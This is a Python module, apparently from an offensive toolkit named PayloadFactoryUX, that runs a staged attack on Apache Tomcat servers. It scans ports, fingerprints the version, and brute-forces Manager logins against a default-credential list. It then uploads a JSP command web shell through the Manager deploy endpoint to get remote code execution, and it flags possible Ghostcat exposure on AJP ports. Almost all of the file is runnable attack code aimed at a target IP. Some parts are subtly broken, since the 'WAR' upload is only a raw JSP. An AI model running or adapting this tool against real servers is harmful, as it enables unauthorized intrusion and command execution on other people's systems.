"""
Tomcat Scanner Module for PayloadFactoryUX Stage 3.

Provides:
- Multi-port scanning (HTTP 8080, AJP 8009)
- Version detection from error pages
- Manager/Host-Manager brute-force
- WAR file deployment for RCE
"""

import socket
import logging
import base64
import time
from typing import Dict, List, Tuple, Optional, Any
from concurrent.futures import ThreadPoolExecutor, as_completed

# Handle both module and standalone imports
try:
    from .tomcat_targets import (
        TOMCAT_CRITICAL_ENDPOINTS,
        TOMCAT_SENSITIVE_PATHS,
        TOMCAT_PORTS,
        TOMCAT_DEFAULT_CREDENTIALS,
        get_all_attack_paths,
        get_brute_force_targets,
    )
except ImportError:
    from tomcat_targets import (
        TOMCAT_CRITICAL_ENDPOINTS,
        TOMCAT_SENSITIVE_PATHS,
        TOMCAT_PORTS,
        TOMCAT_DEFAULT_CREDENTIALS,
        get_all_attack_paths,
        get_brute_force_targets,
    )

logger = logging.getLogger(__name__)


class TomcatScanner:
    """
    Comprehensive Tomcat attack scanner.
    
    Phases:
    1. Port scanning (HTTP/AJP)
    2. Version detection
    3. Endpoint discovery
    4. Credential brute-force
    5. WAR deployment (if creds found)
    """
    
    def __init__(self, target_ip: str, timeout: float = 3.0):
        self.target_ip = target_ip
        self.timeout = timeout
        self.results: Dict[str, Any] = {
            "ports": {"http": [], "ajp": []},
            "version": None,
            "accessible_endpoints": [],
            "credentials": None,
            "vulnerabilities": [],
        }
        
        logger.info(f"TomcatScanner initialized for {target_ip}")
    
    # =========================================================================
    # PHASE 1: PORT SCANNING
    # =========================================================================
    
    def scan_ports(self) -> Dict[str, List[int]]:
        """Scan for open Tomcat HTTP and AJP ports."""
        logger.info(f"Scanning ports on {self.target_ip}...")
        
        for port in TOMCAT_PORTS["http"]:
            if self._is_port_open(port):
                self.results["ports"]["http"].append(port)
                logger.info(f"  [+] HTTP port open: {port}")
        
        for port in TOMCAT_PORTS["ajp"]:
            if self._is_port_open(port):
                self.results["ports"]["ajp"].append(port)
                logger.warning(f"  [!] AJP port open: {port} (Ghostcat vulnerable)")
        
        return self.results["ports"]
    
    def _is_port_open(self, port: int) -> bool:
        """Check if a port is open."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            result = s.connect_ex((self.target_ip, port))
            s.close()
            return result == 0
        except Exception:
            return False
    
    # =========================================================================
    # PHASE 2: VERSION DETECTION
    # =========================================================================
    
    def detect_version(self, port: int = 8080) -> Optional[str]:
        """Detect Tomcat version from error pages."""
        logger.info(f"Detecting Tomcat version on port {port}...")
        
        # Request a non-existent page to trigger 404 with version
        try:
            request = (
                f"GET /nonexistent_page_{int(time.time())} HTTP/1.1\r\n"
                f"Host: {self.target_ip}\r\n"
                f"Connection: close\r\n\r\n"
            )
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target_ip, port))
            s.send(request.encode())
            
            response = b""
            while True:
                chunk = s.recv(4096)
                if not chunk:
                    break
                response += chunk
            s.close()
            
            response_str = response.decode('utf-8', errors='ignore')
            
            # Parse Apache Tomcat/X.X.X from response
            import re
            match = re.search(r'Apache Tomcat/(\d+\.\d+\.\d+)', response_str)
            if match:
                version = match.group(1)
                self.results["version"] = version
                logger.info(f"  [+] Detected Tomcat version: {version}")
                return version
            
            # Check for other identifiers
            if "Apache Tomcat" in response_str:
                logger.info("  [~] Tomcat detected but version hidden")
                self.results["version"] = "unknown"
                return "unknown"
                
        except Exception as e:
            logger.debug(f"Version detection error: {e}")
        
        return None
    
    # =========================================================================
    # PHASE 3: ENDPOINT DISCOVERY
    # =========================================================================
    
    def discover_endpoints(self, port: int = 8080, threads: int = 5) -> List[str]:
        """Check which Tomcat endpoints are accessible."""
        logger.info(f"Discovering accessible endpoints on port {port}...")
        
        accessible = []
        all_paths = get_all_attack_paths()
        
        def check_endpoint(path: str) -> Optional[Tuple[str, int]]:
            status = self._get_status_code(port, path)
            if status and status not in [404, 500]:
                return (path, status)
            return None
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {executor.submit(check_endpoint, path): path for path in all_paths}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    path, status = result
                    accessible.append(path)
                    if status == 401:
                        logger.info(f"  [~] {path} - Requires auth (401)")
                    elif status == 403:
                        logger.info(f"  [~] {path} - Forbidden (403)")
                    else:
                        logger.info(f"  [+] {path} - Accessible ({status})")
        
        self.results["accessible_endpoints"] = accessible
        return accessible
    
    def _get_status_code(self, port: int, path: str) -> Optional[int]:
        """Get HTTP status code for a path."""
        try:
            request = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {self.target_ip}\r\n"
                f"Connection: close\r\n\r\n"
            )
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target_ip, port))
            s.send(request.encode())
            
            response = s.recv(1024).decode('utf-8', errors='ignore')
            s.close()
            
            # Parse status code from "HTTP/1.1 XXX"
            if response.startswith("HTTP/"):
                parts = response.split(" ")
                if len(parts) >= 2:
                    return int(parts[1])
        except Exception:
            pass
        return None
    
    # =========================================================================
    # PHASE 4: CREDENTIAL BRUTE-FORCE
    # =========================================================================
    
    def brute_force_manager(
        self, 
        port: int = 8080, 
        max_attempts: int = 20,
        delay: float = 0.5
    ) -> Optional[Tuple[str, str]]:
        """
        Brute-force /manager/html credentials.
        
        Args:
            port: Target port
            max_attempts: Maximum credential pairs to try
            delay: Delay between attempts (avoid lockout)
            
        Returns:
            (username, password) if found, None otherwise
        """
        logger.info(f"Brute-forcing Manager credentials on port {port}...")
        
        targets = get_brute_force_targets()
        credentials = TOMCAT_DEFAULT_CREDENTIALS[:max_attempts]
        
        for i, (user, passwd) in enumerate(credentials):
            for target_path in targets:
                result = self._try_auth(port, target_path, user, passwd)
                if result:
                    self.results["credentials"] = (user, passwd)
                    logger.critical(f"  [!!!] CREDENTIALS FOUND: {user}:{passwd}")
                    return (user, passwd)
            
            if delay > 0:
                time.sleep(delay)
            
            if (i + 1) % 5 == 0:
                logger.info(f"  [-] Tried {i + 1}/{len(credentials)} credential pairs...")
        
        logger.info("  [-] No valid credentials found")
        return None
    
    def _try_auth(self, port: int, path: str, user: str, passwd: str) -> bool:
        """Try authentication with given credentials."""
        try:
            # Create Basic Auth header
            auth_str = f"{user}:{passwd}"
            auth_b64 = base64.b64encode(auth_str.encode()).decode()
            
            request = (
                f"GET {path} HTTP/1.1\r\n"
                f"Host: {self.target_ip}\r\n"
                f"Authorization: Basic {auth_b64}\r\n"
                f"Connection: close\r\n\r\n"
            )
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((self.target_ip, port))
            s.send(request.encode())
            
            response = s.recv(1024).decode('utf-8', errors='ignore')
            s.close()
            
            # Check for successful auth (200 OK or 302 redirect)
            if "200 OK" in response or "302 Found" in response:
                return True
                
        except Exception:
            pass
        return False
    
    # =========================================================================
    # PHASE 5: WAR DEPLOYMENT (RCE)
    # =========================================================================
    
    def deploy_war_shell(
        self, 
        port: int, 
        creds: Tuple[str, str],
        war_name: str = "pwned"
    ) -> bool:
        """
        Deploy a minimal WAR web shell for RCE.
        
        Args:
            port: Target port
            creds: (username, password) tuple
            war_name: Name for deployed WAR
            
        Returns:
            True if deployment successful
        """
        logger.info(f"Deploying WAR shell '{war_name}' via Manager...")
        
        user, passwd = creds
        auth_str = f"{user}:{passwd}"
        auth_b64 = base64.b64encode(auth_str.encode()).decode()
        
        # Minimal JSP command shell (base64 encoded WAR)
        # This is a simple cmd.jsp that executes commands via ?cmd=
        jsp_shell = (
            b'<%@ page import="java.io.*" %>'
            b'<%String c=request.getParameter("cmd");'
            b'if(c!=null){Process p=Runtime.getRuntime().exec(c);'
            b'BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));'
            b'String l;while((l=br.readLine())!=null){out.println(l);}}%>'
        )
        
        # For simplicity, we'll try the text interface
        # PUT /manager/text/deploy?path=/pwned&war=...
        deploy_path = f"/manager/text/deploy?path=/{war_name}"
        
        try:
            request = (
                f"PUT {deploy_path} HTTP/1.1\r\n"
                f"Host: {self.target_ip}\r\n"
                f"Authorization: Basic {auth_b64}\r\n"
                f"Content-Type: application/octet-stream\r\n"
                f"Content-Length: {len(jsp_shell)}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode() + jsp_shell
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5.0)
            s.connect((self.target_ip, port))
            s.send(request)
            
            response = s.recv(4096).decode('utf-8', errors='ignore')
            s.close()
            
            if "OK - Deployed" in response:
                shell_url = f"http://{self.target_ip}:{port}/{war_name}/cmd.jsp?cmd=id"
                logger.critical(f"  [!!!] SHELL DEPLOYED: {shell_url}")
                self.results["vulnerabilities"].append({
                    "type": "RCE",
                    "method": "WAR Deployment",
                    "shell_url": shell_url,
                })
                return True
            else:
                logger.warning(f"  [-] WAR deployment failed: {response[:100]}")
                
        except Exception as e:
            logger.error(f"  [-] WAR deployment error: {e}")
        
        return False
    
    # =========================================================================
    # FULL SCAN
    # =========================================================================
    
    def full_scan(self, primary_port: int = 8080) -> Dict[str, Any]:
        """
        Run complete Tomcat attack scan.
        
        Returns:
            Complete results dictionary
        """
        logger.info("=" * 50)
        logger.info("TOMCAT DIRECT ATTACK SCAN")
        logger.info("=" * 50)
        
        # Phase 1: Port scan
        self.scan_ports()
        
        # Use primary port or first discovered HTTP port
        port = primary_port
        if primary_port not in self.results["ports"]["http"]:
            if self.results["ports"]["http"]:
                port = self.results["ports"]["http"][0]
            else:
                logger.error("No HTTP ports found!")
                return self.results
        
        # Phase 2: Version detection
        self.detect_version(port)
        
        # Phase 3: Endpoint discovery
        self.discover_endpoints(port)
        
        # Phase 4: Brute-force if manager accessible
        manager_endpoints = [p for p in self.results["accessible_endpoints"] 
                           if "manager" in p and "401" not in str(p)]
        if any("manager" in p for p in self.results["accessible_endpoints"]):
            creds = self.brute_force_manager(port)
            
            # Phase 5: WAR deployment if creds found
            if creds:
                self.deploy_war_shell(port, creds)
        
        # Log AJP warning
        if self.results["ports"]["ajp"]:
            logger.warning("=" * 50)
            logger.warning("AJP PORTS DETECTED - GHOSTCAT (CVE-2020-1938) POSSIBLE")
            logger.warning(f"Ports: {self.results['ports']['ajp']}")
            logger.warning("=" * 50)
            self.results["vulnerabilities"].append({
                "type": "Potential Ghostcat",
                "cve": "CVE-2020-1938",
                "ports": self.results["ports"]["ajp"],
            })
        
        return self.results


# =============================================================================
# MAIN - Test scanner
# =============================================================================

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python tomcat_scanner.py <target_ip> [port]")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 8080
    
    logging.basicConfig(level=logging.INFO, format='%(message)s')
    
    scanner = TomcatScanner(target)
    results = scanner.full_scan(port)
    
    print("\n" + "=" * 50)
    print("SCAN RESULTS")
    print("=" * 50)
    print(f"Target: {target}")
    print(f"Ports: {results['ports']}")
    print(f"Version: {results['version']}")
    print(f"Accessible Endpoints: {len(results['accessible_endpoints'])}")
    print(f"Credentials: {results['credentials']}")
    print(f"Vulnerabilities: {results['vulnerabilities']}")
